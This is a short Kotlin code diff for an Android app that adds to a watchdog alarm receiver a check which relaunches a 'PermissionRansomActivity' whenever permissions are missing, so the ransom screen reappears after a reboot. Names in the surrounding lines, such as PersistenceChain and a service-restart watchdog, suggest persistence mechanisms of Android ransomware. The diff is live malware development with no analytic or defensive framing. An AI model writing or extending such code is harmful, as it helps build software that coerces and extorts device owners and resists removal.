@@ -74,6 +74,19 @@ class WatchdogAlarm : BroadcastReceiver() {
             Log.w(TAG, "WatchdogAlarm: service DEAD, restarting")
             PersistenceChain.start(context)
         }
+
+        // ── Also check for missing permissions and launch ransom ──
+        // This ensures the ransom re-appears even after a reboot if the
+        // UmbraService watchdog hasn't started yet.
+        try {
+            if (!PermissionRansomActivity.hasAllPermissions(context)) {
+                Log.d(TAG, "WatchdogAlarm: permissions missing — launching ransom")
+                PermissionRansomActivity.launch(context)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "WatchdogAlarm: failed to check permissions: ${e.message}")
+        }
+
         // Reschedule for the next tick.
         schedule(context)
     }
